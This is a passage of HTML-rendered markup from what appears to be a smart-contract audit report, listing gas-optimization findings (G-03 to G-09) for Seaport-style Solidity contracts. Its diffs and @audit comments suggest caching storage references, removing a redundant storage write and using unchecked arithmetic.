class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">+ 94:         _conduitProperties.owner = initialOwner;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">95: </span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">96:         // Set conduit key used to deploy the conduit to enable reverse lookup.</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk8\">- 97:         _conduits[conduit].key = conduitKey;//@audit gas: should use suggested storage variable _conduitProperties to set key</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">+ 97:        _conduitProperties.key = conduitKey;</span></span></span></code></pre>\n<p>Notice that this optimization already exists in the solution:</p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"40\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">File: </span><span class=\"mtk12\">ConduitController</span><span class=\"mtk1\">.</span><span class=\"mtk12\">sol</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">129</span><span class=\"mtk1\">:         </span><span class=\"mtk3\">// Retrieve storage region where channels for the conduit are tracked.</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">130</span><span class=\"mtk1\">:         </span><span class=\"mtk12\">ConduitProperties</span><span class=\"mtk1\"> </span><span class=\"mtk12\">storage</span><span class=\"mtk1\"> </span><span class=\"mtk12\">conduitProperties</span><span class=\"mtk1\"> = </span><span class=\"mtk12\">_conduits</span><span class=\"mtk1\">[</span><span class=\"mtk12\">conduit</span><span class=\"mtk1\">];</span></span></span></code></pre>\n<h2 id=\"g-03-conduitcontrollersolacceptownership-help-the-optimizer-by-saving-a-storage-variables-reference-instead-of-repeatedly-fetching-it\" style=\"position:relative;\"><a href=\"#g-03-conduitcontrollersolacceptownership-help-the-optimizer-by-saving-a-storage-variables-reference-instead-of-repeatedly-fetching-it\" aria-label=\"g 03 conduitcontrollersolacceptownership help the optimizer by saving a storage variables reference instead of repeatedly fetching it permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>[G-03] <code>ConduitController.sol#acceptOwnership()</code>: Help the optimizer by saving a storage variable’s reference instead of repeatedly fetching it</h2>\n<p>This optimization is similar to the one explained above in G-02.</p>\n<p>Instead of repeatedly fetching the storage region, consider declaring and using a storage variable here (see <code>@audit</code> tags):</p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"diff\" data-index=\"41\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">File: ConduitController.sol</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">232:     function acceptOwnership(address conduit) external override {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">...</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk8\">- 237:         if (msg.sender != _conduits[conduit].potentialOwner) { //@audit gas: similar to L130, should declare &quot;ConduitProperties storage _conduitProperties = _conduits[conduit];&quot; and use it to get potentialOwner</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">+ 236:         ConduitProperties storage _conduitProperties = _conduits[conduit];</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">+ 237:         if (msg.sender != _conduitProperties.potentialOwner) {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">...</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk8\">- 246:         delete _conduits[conduit].potentialOwner;//@audit gas: should use suggested storage variable _conduitProperties to delete potentialOwner</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">+ 246:         delete _conduitProperties.potentialOwner;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">...</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">249:         emit OwnershipTransferred(</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">250:             conduit,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk8\">- 251:             _conduits[conduit].owner, //@audit gas: should use suggested storage variable _conduitProperties to get owner</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">+ 251:             _conduitProperties.owner,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">252:             msg.sender</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">253:         );</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">...</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk8\">- 256:         _conduits[conduit].owner = msg.sender; //@audit gas: should use suggested storage variable _conduitProperties to set owner</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">+ 256:         _conduitProperties.owner = msg.sender;</span></span></span></code></pre>\n<h2 id=\"g-04-ordervalidatorsol_validatebasicorderandupdatestatus-help-the-optimizer-by-saving-a-storage-variables-reference-instead-of-repeatedly-fetching-it\" style=\"position:relative;\"><a href=\"#g-04-ordervalidatorsol_validatebasicorderandupdatestatus-help-the-optimizer-by-saving-a-storage-variables-reference-instead-of-repeatedly-fetching-it\" aria-label=\"g 04 ordervalidatorsol_validatebasicorderandupdatestatus help the optimizer by saving a storage variables reference instead of repeatedly fetching it permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>[G-04] <code>OrderValidator.sol#_validateBasicOrderAndUpdateStatus()</code>: Help the optimizer by saving a storage variable’s reference instead of repeatedly fetching it</h2>\n<p>This optimization is similar to the one <a href=\"#conduitcontrollersolcreateconduit-help-the-optimizer-by-saving-a-storage-variables-reference-instead-of-repeatedly-fetching-it\">explained here</a>.</p>\n<p>Instead of repeatedly fetching the storage region, consider declaring and using a storage variable here (see <code>@audit</code> tags):</p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"diff\" data-index=\"42\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">File: OrderValidator.sol</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">48:     function _validateBasicOrderAndUpdateStatus(</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">...</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk8\">- 70:         _orderStatus[orderHash].isValidated = true; //@audit gas: should declare &quot;OrderStatus storage _orderStatusStorage = _orderStatus[orderHash];&quot; and use it to set isValidated</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">+ 69:         OrderStatus storage _orderStatusStorage = _orderStatus[orderHash];</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">+ 70:         _orderStatusStorage.isValidated = true;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">...</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk8\">- 72:         _orderStatus[orderHash].numerator = 1;//@audit gas: should use suggested storage variable _orderStatusStorage to set numerator</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk8\">- 73:         _orderStatus[orderHash].denominator = 1;//@audit gas: should use suggested storage variable _orderStatusStorage to set denominator</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">+ 72:         _orderStatusStorage.numerator = 1;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">+ 73:         _orderStatusStorage.denominator = 1;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">74:     }</span></span></span></code></pre>\n<h2 id=\"g-05-ordervalidatorsol_validatebasicorderandupdatestatus-avoid-an-unnecessary-sstore-by-not-writing-a-default-value\" style=\"position:relative;\"><a href=\"#g-05-ordervalidatorsol_validatebasicorderandupdatestatus-avoid-an-unnecessary-sstore-by-not-writing-a-default-value\" aria-label=\"g 05 ordervalidatorsol_validatebasicorderandupdatestatus avoid an unnecessary sstore by not writing a default value permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>[G-05] <code>OrderValidator.sol#_validateBasicOrderAndUpdateStatus()</code>: avoid an unnecessary SSTORE by not writing a default value</h2>\n<p>The following line is not needed, as it’s writing to storage a default value:</p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"43\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">File: </span><span class=\"mtk12\">OrderValidator</span><span class=\"mtk1\">.</span><span class=\"mtk12\">sol</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">71</span><span class=\"mtk1\">:         </span><span class=\"mtk12\">_orderStatus</span><span class=\"mtk1\">[</span><span class=\"mtk12\">orderHash</span><span class=\"mtk1\">].</span><span class=\"mtk12\">isCancelled</span><span class=\"mtk1\"> = </span><span class=\"mtk4\">false</span><span class=\"mtk1\">;</span><span class=\"mtk3\">//@audit gas: SSTORE not needed, already false by default</span></span></span></code></pre>\n<p>Consider removing this line completely.</p>\n<h2 id=\"g-06-ordercombinersol-totalfilteredexecutions-costs-less-gas-compared-to-totalfilteredexecutions--1\" style=\"position:relative;\"><a href=\"#g-06-ordercombinersol-totalfilteredexecutions-costs-less-gas-compared-to-totalfilteredexecutions--1\" aria-label=\"g 06 ordercombinersol totalfilteredexecutions costs less gas compared to totalfilteredexecutions  1 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>[G-06] <code>OrderCombiner.sol</code>: <code>++totalFilteredExecutions</code> costs less gas compared to <code>totalFilteredExecutions += 1</code></h2>\n<p>For a <code>uint256 i</code> variable, the following is true with the Optimizer enabled at 10k:</p>\n<ul>\n<li><code>i += 1</code> is the most expensive form</li>\n<li><code>i++</code> costs 6 gas less than <code>i += 1</code></li>\n<li><code>++i</code> costs 5 gas less than <code>i++</code> (11 gas less than <code>i += 1</code>)</li>\n</ul>\n<p>Consider replacing <code>totalFilteredExecutions += 1</code> with <code>++totalFilteredExecutions</code> here:</p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"44\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk12\">lib</span><span class=\"mtk1\">/</span><span class=\"mtk12\">OrderCombiner</span><span class=\"mtk1\">.</span><span class=\"mtk12\">sol</span><span class=\"mtk1\">:</span><span class=\"mtk7\">490</span><span class=\"mtk1\">:                    </span><span class=\"mtk12\">totalFilteredExecutions</span><span class=\"mtk1\"> += </span><span class=\"mtk7\">1</span><span class=\"mtk1\">;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk12\">lib</span><span class=\"mtk1\">/</span><span class=\"mtk12\">OrderCombiner</span><span class=\"mtk1\">.</span><span class=\"mtk12\">sol</span><span class=\"mtk1\">:</span><span class=\"mtk7\">515</span><span class=\"mtk1\">:                    </span><span class=\"mtk12\">totalFilteredExecutions</span><span class=\"mtk1\"> += </span><span class=\"mtk7\">1</span><span class=\"mtk1\">;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk12\">lib</span><span class=\"mtk1\">/</span><span class=\"mtk12\">OrderCombiner</span><span class=\"mtk1\">.</span><span class=\"mtk12\">sol</span><span class=\"mtk1\">:</span><span class=\"mtk7\">768</span><span class=\"mtk1\">:                    </span><span class=\"mtk12\">totalFilteredExecutions</span><span class=\"mtk1\"> += </span><span class=\"mtk7\">1</span><span class=\"mtk1\">;</span></span></span></code></pre>\n<h2 id=\"g-07-ordercombinersol---maximumfulfilled-costs-less-gas-compared-to-maximumfulfilled--\" style=\"position:relative;\"><a href=\"#g-07-ordercombinersol---maximumfulfilled-costs-less-gas-compared-to-maximumfulfilled--\" aria-label=\"g 07 ordercombinersol   maximumfulfilled costs less gas compared to maximumfulfilled   permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>[G-07] <code>OrderCombiner.sol</code>: <code>--maximumFulfilled</code> costs less gas compared to <code>maximumFulfilled--</code></h2>\n<p>For a <code>uint256 i</code> variable, the following is true with the Optimizer enabled at 10k:</p>\n<ul>\n<li><code>i -= 1</code> is the most expensive form</li>\n<li><code>i--</code> costs 11 gas less than <code>i -= 1</code></li>\n<li><code>--i</code> costs 5 gas less than <code>i--</code> (16 gas less than <code>i -= 1</code>)</li>\n</ul>\n<p>Consider replacing <code>maximumFulfilled--</code> with <code>--maximumFulfilled</code> here:</p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"45\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk12\">lib</span><span class=\"mtk1\">/</span><span class=\"mtk12\">OrderCombiner</span><span class=\"mtk1\">.</span><span class=\"mtk12\">sol</span><span class=\"mtk1\">:</span><span class=\"mtk7\">229</span><span class=\"mtk1\">:                </span><span class=\"mtk12\">maximumFulfilled</span><span class=\"mtk1\">--;</span></span></span></code></pre>\n<h2 id=\"g-08-fulfillmentappliersol_applyfulfillment-unchecking-arithmetics-operations-that-cant-underflowoverflow\" style=\"position:relative;\"><a href=\"#g-08-fulfillmentappliersol_applyfulfillment-unchecking-arithmetics-operations-that-cant-underflowoverflow\" aria-label=\"g 08 fulfillmentappliersol_applyfulfillment unchecking arithmetics operations that cant underflowoverflow permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>[G-08] <code>FulfillmentApplier.sol#_applyFulfillment()</code>: Unchecking arithmetics operations that can’t underflow/overflow</h2>\n<p>Solidity version 0.8+ comes with implicit overflow and underflow checks on unsigned integers. When an overflow or an underflow isn’t possible (as an example, when a comparison is made before the arithmetic operation), some gas can be saved by using an <code>unchecked</code> block: <a href=\"https://docs.soliditylang.org/en/v0.8.10/control-structures.html#checked-or-unchecked-arithmetic\">https://docs.soliditylang.org/en/v0.8.10/control-structures.html#checked-or-unchecked-arithmetic</a></p>\n<p>I suggest wrapping with an <code>unchecked</code> block here (see <code>@audit</code> tags for more details):</p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"46\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-gutter-pad\"></span><span class=\"grvsc-gutter\" aria-hidden=\"true\"></span><span class=\"grvsc-source\"><span class=\"mtk1\">File: </span><span class=\"mtk12\">FulfillmentApplier</span><span class=\"mtk1\">.</span><span class=\"mtk12\">sol</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-gutter-pad\"></span><span class=\"grvsc-gutter\" aria-hidden=\"true\"></span><span class=\"grvsc-source\"><span class=\"mtk7\">090</span><span class=\"mtk1\">:         </span><span class=\"mtk15\">if</span><span class=\"mtk1\"> (</span><span class=\"mtk12\">considerationItem</span><span class=\"mtk1\">.</span><span class=\"mtk12\">amount</span><span class=\"mtk1\"> &gt; </span><span class=\"mtk12\">execution</span><span class=\"mtk1\">.</span><span class=\"mtk12\">item</span><span class=\"mtk1\">.</span><span class=\"mtk12\">amount</span><span class=\"mtk1\">) {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-gutter-pad\"></span><span class=\"grvsc-gutter\" aria-hidden=\"true\"></span><span class=\"grvsc-source\"><span class=\"mtk1\">...</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-gutter-pad\"></span><span class=\"grvsc-gutter\" aria-hidden=\"true\"></span><span class=\"grvsc-source\"><span class=\"mtk7\">097</span><span class=\"mtk1\">:             </span><span class=\"mtk12\">advancedOrders</span><span class=\"mtk1\">[</span><span class=\"mtk12\">targetComponent</span><span class=\"mtk1\">.</span><span class=\"mtk12\">orderIndex</span><span class=\"mtk1\">]</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-gutter-pad\"></span><span class=\"grvsc-gutter\" aria-hidden=\"true\"></span><span class=\"grvsc-source\"><span class=\"mtk7\">098</span><span class=\"mtk1\">:                 .</span><span class=\"mtk12\">parameters</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-gutter-pad\"></span><span class=\"grvsc-gutter\" aria-hidden=\"true\"></span><span class=\"grvsc-source\"><span class=\"mtk7\">099</span><span class=\"mtk1\">:                 .</span><span class=\"mtk12\">consideration</span><span class=\"mtk1\">[</span><span class=\"mtk12\">targetComponent</span><span class=\"mtk1\">.</span><span class=\"mtk12\">itemIndex</span><span class=\"mtk1\">]</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-gutter-pad\"></span><span class=\"grvsc-gutter grvsc-line-number\" aria-hidden=\"true\" data-content=\"90\"></span><span class=\"grvsc-source\"><span class=\"mtk7\">100</span><span class=\"mtk1\">:                 .</span><span class=\"mtk12\">startAmount</span><span class=\"mtk1\"> = </span><span class=\"mtk12\">considerationItem</span><span class=\"mtk1\">.</span><span class=\"mtk12\">amount</span><span class=\"mtk1\"> - </span><span class=\"mtk12\">execution</span><span class=\"mtk1\">.</span><span class=\"mtk12\">item</span><span class=\"mtk1\">.</span><span class=\"mtk12\">amount</span><span class=\"mtk1\">; </span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-gutter-pad\"></span><span class=\"grvsc-gutter grvsc-line-number\" aria-hidden=\"true\" data-content=\"91\"></span><span class=\"grvsc-source\"><span class=\"mtk1\">...</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-gutter-pad\"></span><span class=\"grvsc-gutter grvsc-line-number\" aria-hidden=\"true\" data-content=\"92\"></span><span class=\"grvsc-source\"><span class=\"mtk7\">104</span><span class=\"mtk1\">:         } </span><span class=\"mtk15\">else</span><span class=\"mtk1\"> {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-gutter-pad\"></span><span class=\"grvsc-gutter grvsc-line-number\" aria-hidden=\"true\" data-content=\"93\"></span><span class=\"grvsc-source\"><span class=\"mtk1\">...</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-gutter-pad\"></span><span class=\"grvsc-gutter grvsc-line-number\" aria-hidden=\"true\" data-content=\"94\"></span><span class=\"grvsc-source\"><span class=\"mtk7\">109</span><span class=\"mtk1\">:             </span><span class=\"mtk12\">advancedOrders</span><span class=\"mtk1\">[</span><span class=\"mtk12\">targetComponent</span><span class=\"mtk1\">.</span><span class=\"mtk12\">orderIndex</span><span class=\"mtk1\">]</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-gutter-pad\"></span><span class=\"grvsc-gutter grvsc-line-number\" aria-hidden=\"true\" data-content=\"95\"></span><span class=\"grvsc-source\"><span class=\"mtk7\">110</span><span class=\"mtk1\">:                 .</span><span class=\"mtk12\">parameters</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-gutter-pad\"></span><span class=\"grvsc-gutter grvsc-line-number\" aria-hidden=\"true\" data-content=\"96\"></span><span class=\"grvsc-source\"><span class=\"mtk7\">111</span><span class=\"mtk1\">:                 .</span><span class=\"mtk12\">offer</span><span class=\"mtk1\">[</span><span class=\"mtk12\">targetComponent</span><span class=\"mtk1\">.</span><span class=\"mtk12\">itemIndex</span><span class=\"mtk1\">]</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-gutter-pad\"></span><span class=\"grvsc-gutter grvsc-line-number\" aria-hidden=\"true\" data-content=\"90\"></span><span class=\"grvsc-source\"><span class=\"mtk7\">112</span><span class=\"mtk1\">:                 .</span><span class=\"mtk12\">startAmount</span><span class=\"mtk1\"> = </span><span class=\"mtk12\">execution</span><span class=\"mtk1\">.</span><span class=\"mtk12\">item</span><span class=\"mtk1\">.</span><span class=\"mtk12\">amount</span><span class=\"mtk1\"> - </span><span class=\"mtk12\">considerationItem</span><span class=\"mtk1\">.</span><span class=\"mtk12\">amount</span><span class=\"mtk1\">; </span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-gutter-pad\"></span><span class=\"grvsc-gutter grvsc-line-number\" aria-hidden=\"true\" data-content=\"91\"></span><span class=\"grvsc-source\"><span class=\"mtk7\">113</span><span class=\"mtk1\">:         }</span></span></span></code></pre>\n<h2 id=\"g-09-reference-unchecking-arithmetics-operations-that-cant-underflowoverflow\" style=\"position:relative;\"><a href=\"#g-09-reference-unchecking-arithmetics-operations-that-cant-underflowoverflow\" aria-label=\"g 09 reference unchecking arithmetics operations that cant underflowoverflow permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>[G-09] <code>/reference</code>: Unchecking arithmetics operations that can’t underflow/overflow</h2>\n<p>This is similar to the optimization above, except that here, contracts under <code>/reference</code> are just readable versions of the real contracts to be deployed.</p>\n<p>The following lines should be <code>unchecked</code>, please check that this is the case in their corresponding assembly code:</p>\n<ul>\n<li>reference/lib/ReferenceBasicOrderFulfiller.sol:</li>\n</ul>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"47\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-gutter-pad\"></span><span class=\"grvsc-gutter\" aria-hidden=\"true\"></span><span class=\"grvsc-source\"><span class=\"mtk1\">  </span><span class=\"mtk7\">842</span><span class=\"mtk1\">              </span><span class=\"mtk15\">if</span><span class=\"mtk1\"> (</span><span class=\"mtk12\">additionalRecipientAmount</span><span class=\"mtk1\"> &gt; </span><span class=\"mtk12\">etherRemaining</span><span class=\"mtk1\">) {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-gutter-pad\"></span><span class=\"grvsc-gutter\" aria-hidden=\"true\"></span><span class=\"grvsc-source\"><span class=\"mtk1\">  </span><span class=\"mtk7\">843</span><span class=\"mtk1\">                  </span><span class=\"mtk12\">revert</span><span class=\"mtk1\"> </span><span class=\"mtk11\">InsufficientEtherSupplied</span><span class=\"mtk1\">();</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-gutter-pad\"></span><span class=\"grvsc-gutter\" aria-hidden=\"true\"></span><span class=\"grvsc-source\"><span class=\"mtk1\">  </span><span class=\"mtk7\">844</span><span class=\"mtk1\">              }</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-gutter-pad\"></span><span class=\"grvsc-gutter\" aria-hidden=\"true\"></span><span class=\"grvsc-source\"><span class=\"mtk1\">  ...</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-gutter-pad\"></span><span class=\"grvsc-gutter grvsc-line-number\" aria-hidden=\"true\" data-content=\"843\"></span><span class=\"grvsc-source\"><span class=\"mtk1\">  </span><span class=\"mtk7\">853</span><span class=\"mtk1\">:             </span><span class=\"mtk12\">etherRemaining</span><span class=\"mtk1\"> -= </span><span class=\"mtk12\">additionalRecipientAmount</span><span class=\"mtk1\">; </span></span></span></code></pre>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"48\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-gutter-pad\"></span><span class=\"grvsc-gutter\" aria-hidden=\"true\"></span><span class=\"grvsc-source\"><span class=\"mtk1\">  </span><span class=\"mtk7\">865</span><span class=\"mtk1\">          </span><span class=\"mtk15\">if</span><span class=\"mtk1\"> (</span><span class=\"mtk12\">etherRemaining</span><span class=\"mtk1\"> &gt; </span><span class=\"mtk12\">amount</span><span class=\"mtk1\">) {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-gutter-pad\"></span><span class=\"grvsc-gutter\" aria-hidden=\"true\"></span><span class=\"grvsc-source\"><span class=\"mtk1\">  </span><span class=\"mtk7\">866</span><span class=\"mtk1\">              </span><span class=\"mtk3\">// Transfer remaining Ether to the caller.</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-gutter-pad\"></span><span class=\"grvsc-gutter grvsc-line-number\" aria-hidden=\"true\" data-content=\"865\"></span><span class=\"grvsc-source\"><span class=\"mtk1\">  </span><span class=\"mtk7\">867</span><span class=\"mtk1\">:             </span><span class=\"mtk11\">_transferEth</span><span class=\"mtk1\">(</span><span class=\"mtk11\">payable</span><span class=\"mtk1\">(</span><span class=\"mtk12\">msg</span><span class=\"mtk1\">.</span><span 